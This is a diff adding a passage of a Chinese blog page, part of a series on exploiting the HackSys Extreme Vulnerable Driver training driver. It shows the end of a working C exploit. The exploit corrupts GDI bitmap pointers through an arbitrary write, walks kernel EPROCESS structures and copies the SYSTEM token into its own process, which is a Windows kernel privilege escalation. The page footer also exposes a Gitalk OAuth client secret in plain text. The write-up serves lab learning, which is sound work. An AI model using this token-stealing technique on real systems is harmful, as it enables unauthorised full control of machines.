+                    <span class="n">ntoskrnlKernelBase</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+                    <span class="k">break</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="k">else</span> <span class="p">{</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="p">(</span><span class="n">cDrivers</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
+                        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;can&#39;t find driver name</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+                        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+                    <span class="p">}</span>
+                    <span class="k">continue</span><span class="p">;</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+            <span class="k">else</span> <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;get device driver name failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Enumerate Device Drivers failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;driver name is: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">driverName</span><span class="p">);</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">DWORD32</span><span class="p">)</span><span class="n">driversAddress</span><span class="p">[</span><span class="n">ntoskrnlKernelBase</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="n">DWORD32</span> <span class="nf">getSystemEProcessAddr</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">DWORD32</span> <span class="n">ntoskrnlKernelBase</span> <span class="o">=</span> <span class="n">getKernelBase</span><span class="p">();</span>
+    <span class="n">DWORD32</span> <span class="n">ntoskrnlUserBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD32</span><span class="p">)</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="n">driverName</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ntoskrnlUserBase</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;load library failed!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">DWORD32</span> <span class="n">PsInitialSystemProcessUserSpaceAddr</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD32</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">((</span><span class="n">HMODULE</span><span class="p">)</span><span class="n">ntoskrnlUserBase</span><span class="p">,</span> <span class="s">&quot;PsInitialSystemProcess&quot;</span><span class="p">);</span>
+    <span class="n">DWORD32</span> <span class="n">PsInitialSystemProcessKernelSpaceAddr</span> <span class="o">=</span> <span class="n">ntoskrnlKernelBase</span> <span class="o">+</span> <span class="p">(</span><span class="n">PsInitialSystemProcessUserSpaceAddr</span> <span class="o">-</span> <span class="n">ntoskrnlUserBase</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">PsInitialSystemProcessKernelSpaceAddr</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+
+    <span class="n">HBITMAP</span> <span class="n">hManager</span> <span class="o">=</span> <span class="n">CreateBitmap</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hManager</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;create manager bitmap failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">HBITMAP</span> <span class="n">hWorker</span> <span class="o">=</span> <span class="n">CreateBitmap</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hWorker</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;create worker bitmap failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Manager bitmap:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">DWORD32</span> <span class="n">ManagerpvScan0Address</span> <span class="o">=</span> <span class="n">getpvScan0Address</span><span class="p">(</span><span class="n">hManager</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Worker bitmap:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">DWORD32</span> <span class="n">WorkerpvScan0Address</span> <span class="o">=</span> <span class="n">getpvScan0Address</span><span class="p">(</span><span class="n">hWorker</span><span class="p">);</span>
+
+    <span class="n">PPayload</span> <span class="n">payload</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="c1">// malloc</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="n">PPayload</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span>
+        <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span>
+        <span class="k">sizeof</span><span class="p">(</span><span class="n">Payload</span><span class="p">));</span>
+    <span class="n">payload</span> <span class="o">-&gt;</span> <span class="n">what</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">)</span><span class="o">&amp;</span><span class="n">WorkerpvScan0Address</span><span class="p">;</span>
+    <span class="n">payload</span> <span class="o">-&gt;</span> <span class="n">where</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">)</span><span class="n">ManagerpvScan0Address</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">BytesReturned</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&quot;</span><span class="p">,</span> <span class="mh">0xC0000000</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x0022200B</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Payload</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">BytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="c1">// 已经 overwrite 了，接下来就是利用 SetBitmapBits 和 GetBitmapBits 来读写</span>
+
+    <span class="n">DWORD32</span> <span class="n">systemEprocessAddr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">LPVOID</span> <span class="n">lpSystemToken</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="c1">// 获取 system 进程的 token</span>
+    <span class="n">readOOB</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">hWorker</span><span class="p">,</span> <span class="n">getSystemEProcessAddr</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">systemEprocessAddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD32</span><span class="p">));</span>
+    <span class="n">readOOB</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">hWorker</span><span class="p">,</span> <span class="p">(</span><span class="n">systemEprocessAddr</span> <span class="o">+</span> <span class="mh">0x0f8</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">lpSystemToken</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD32</span><span class="p">));</span>
+
+    <span class="c1">// _eprocess + 0x0f8 是 token</span>
+    <span class="c1">// _eprocess + 0x0B8 是 ActiveProcessLinks.Flink</span>
+    <span class="c1">// _eprocess + 0x0b4 是 processid</span>
+    <span class="c1">// 获取当前进程的 _eprocess</span>
+    <span class="n">DWORD32</span> <span class="n">lpNextEPROCESS</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">LPVOID</span> <span class="n">lpCurrentPID</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">DWORD32</span> <span class="n">dwCurrentPID</span><span class="p">;</span>
+    <span class="n">LIST_ENTRY</span> <span class="n">lpNextEntryAddreess</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+    <span class="n">DWORD32</span> <span class="n">currentProcessID</span> <span class="o">=</span> <span class="n">GetCurrentProcessId</span><span class="p">();</span>   <span class="c1">// 通过PID判断是否获取到当前进程的地址</span>
+    <span class="n">readOOB</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">hWorker</span><span class="p">,</span> <span class="n">systemEprocessAddr</span> <span class="o">+</span> <span class="mh">0x0B8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lpNextEntryAddreess</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">LIST_ENTRY</span><span class="p">));</span>
+
+    <span class="k">do</span>  <span class="c1">// 根据PID是否找到当前进程 </span>
+    <span class="p">{</span>
+        <span class="c1">// 获取下一个进程</span>
+        <span class="n">lpNextEPROCESS</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD32</span><span class="p">)((</span><span class="n">PUCHAR</span><span class="p">)</span><span class="n">lpNextEntryAddreess</span><span class="p">.</span><span class="n">Flink</span> <span class="o">-</span> <span class="mh">0x0B8</span><span class="p">);</span>
+        <span class="c1">// 获取PID</span>
+        <span class="n">readOOB</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">hWorker</span><span class="p">,</span> <span class="n">lpNextEPROCESS</span> <span class="o">+</span> <span class="mh">0x0b4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lpCurrentPID</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">LPVOID</span><span class="p">));</span>
+        <span class="n">dwCurrentPID</span> <span class="o">=</span> <span class="n">LOWORD</span><span class="p">(</span><span class="n">lpCurrentPID</span><span class="p">);</span>
+        <span class="n">readOOB</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">hWorker</span><span class="p">,</span> <span class="n">lpNextEPROCESS</span> <span class="o">+</span> <span class="mh">0x0B8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lpNextEntryAddreess</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">LIST_ENTRY</span><span class="p">));</span>
+    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">dwCurrentPID</span> <span class="o">!=</span> <span class="n">currentProcessID</span><span class="p">);</span>
+
+    <span class="n">DWORD32</span> <span class="n">currentTokenAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD32</span><span class="p">)</span><span class="n">lpNextEPROCESS</span> <span class="o">+</span> <span class="mh">0x0f8</span><span class="p">;</span>
+    <span class="n">writeOOB</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">hWorker</span><span class="p">,</span> <span class="n">currentTokenAddress</span><span class="p">,</span> <span class="n">lpSystemToken</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">LPVOID</span><span class="p">));</span>
+
+    <span class="n">system</span><span class="p">(</span><span class="s">&quot;whoami</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+
+<span class="p">}</span>
+</pre></div>
+
+<h2 id="0x05">0x05 结束语<a class="headerlink" href="#0x05" title="Permanent link">&para;</a></h2>
+<p>近来事情比较多，不太能认认真真地好好学习</p>
+<hr />
+<p align='right'>2019.9.11</p>
+                
+                  
+                
+              
+              
+                <blockquote class = "page-copyright">
+    <p>本页面的全部内容在 <strong>CC BY-NC-SA 3.0</strong> 协议之条款下提供</p>
+</blockquote>
+<!-- Comments Integration -->
+
+<h2 id="__comments">Comments</h2>
+<form id="gitalk-form" onsubmit="return false;">
+    <div id="gitalk-container"></div>
+</form>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: 'd918413ad93a14f36876',
+        clientSecret: '9c5740494e6c1c792df208d8abed35ef2bfd855d',
+        repo: 'comment',
+        owner: '50u1w4y',
+        admin: ['50u1w4y'],
+        id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../useAfterFree/" title="（七）HEVD Use After Free" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                （七）HEVD Use After Free
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../../misc/homePage/" title="Home Page" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                Home Page
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; 2019 50u1w4y
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.245445c6.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
+      
+    
+  </body>
+</html>
